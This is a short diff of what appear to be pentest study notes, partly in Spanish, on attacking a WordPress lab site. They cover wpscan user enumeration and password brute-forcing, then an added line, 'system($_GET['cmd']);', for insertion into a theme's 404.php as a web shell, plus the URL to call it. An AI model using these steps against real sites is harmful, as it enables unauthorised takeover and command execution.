@@ -22,7 +22,8 @@ curl -s -I -X GET http://blog.inlanefreight.com/?author=1
 wpscan -url "" --enumerate  --api-token <api-token>
 wpscan -url "" --usernames "" --passwords "dictio"
 
-
+pasar comando para insertar código como parametro:
+system($_GET['cmd']);
 
 acceder a la pagina php con la shell
 http://"ip o url"/wp-content/themes/"tema"/404.php
